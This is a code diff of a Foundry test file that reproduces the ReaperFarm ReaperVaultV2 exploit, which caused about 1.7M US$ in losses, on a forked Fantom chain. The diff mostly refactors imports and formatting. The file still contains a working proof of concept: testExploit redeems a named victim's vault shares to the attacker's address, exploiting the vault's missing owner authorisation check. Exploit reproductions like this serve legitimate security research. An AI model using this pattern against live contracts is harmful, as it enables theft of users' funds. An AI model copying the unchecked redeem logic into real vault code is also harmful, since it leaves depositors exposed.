@@ -2,7 +2,8 @@
 pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
-import "./../interface.sol";
+
+import {IERC20} from "OpenZeppelin/interfaces/IERC20.sol";
 
 // @KeyInfo - Total Lost : ~1.7M US$
 // Attacker : 0x5636e55e4a72299a0f194c001841e2ce75bb527a (ReaperFarm Exploiter 1 - who trigger the exploit)
@@ -23,36 +24,54 @@ import "./../interface.sol";
 // Beosin : https://twitter.com/BeosinAlert/status/1554476940593340421
 
 contract Attacker is Test {
-
-    CheatCodes constant cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
-    IReaperVaultV2 constant ReaperVault = IReaperVaultV2(0xcdA5deA176F2dF95082f4daDb96255Bdb2bc7C7D);
+    IReaperVaultV2 constant ReaperVault =
+        IReaperVaultV2(0xcdA5deA176F2dF95082f4daDb96255Bdb2bc7C7D);
     IERC20 constant USDC = IERC20(0x04068DA6C83AFCFA0e13ba15A6696662335D5B75);
 
     function setUp() public {
-        console.log("This is a simple PoC that shows how attacker abuse the ReaperVaultV2 contract");
-        cheat.createSelectFork("fantom", 44_045_899);
-        cheat.label(address(ReaperVault), "ReaperVault");
-        cheat.label(address(USDC), "USDC");
+        console.log(
+            "This is a simple PoC that shows how attacker abuse the ReaperVaultV2 contract"
+        );
+        vm.createSelectFork("fantom", 44_045_899);
+        vm.label(address(ReaperVault), "ReaperVault");
+        vm.label(address(USDC), "USDC");
     }
 
     function testExploit() public {
         address victim = 0x59cb9F088806E511157A6c92B293E5574531022A;
-        emit log_named_decimal_uint("Victim ReaperUSDCVault balance", ReaperVault.balanceOf(victim), 6);
-        emit log_named_decimal_uint("Attacker USDC balance", USDC.balanceOf(address(this)), 6);
+        emit log_named_decimal_uint(
+            "Victim ReaperUSDCVault balance",
+            ReaperVault.balanceOf(victim),
+            6
+        );
+        emit log_named_decimal_uint(
+            "Attacker USDC balance",
+            USDC.balanceOf(address(this)),
+            6
+        );
 
         console.log("Exploit...");
         uint256 victim_bal = ReaperVault.balanceOf(victim);
         ReaperVault.redeem(victim_bal, address(this), victim);
 
-        emit log_named_decimal_uint("Victim ReaperUSDCVault balance", ReaperVault.balanceOf(victim), 6);
-        emit log_named_decimal_uint("Attacker USDC balance", USDC.balanceOf(address(this)), 6);
+        emit log_named_decimal_uint(
+            "Victim ReaperUSDCVault balance",
+            ReaperVault.balanceOf(victim),
+            6
+        );
+        emit log_named_decimal_uint(
+            "Attacker USDC balance",
+            USDC.balanceOf(address(this)),
+            6
+        );
     }
-
 }
 
 interface IReaperVaultV2 {
-
     function balanceOf(address owner) external view returns (uint256);
-    function redeem(uint256 shares, address receiver, address owner) external returns (uint256 assets);
-
+    function redeem(
+        uint256 shares,
+        address receiver,
+        address owner
+    ) external returns (uint256 assets);
 }
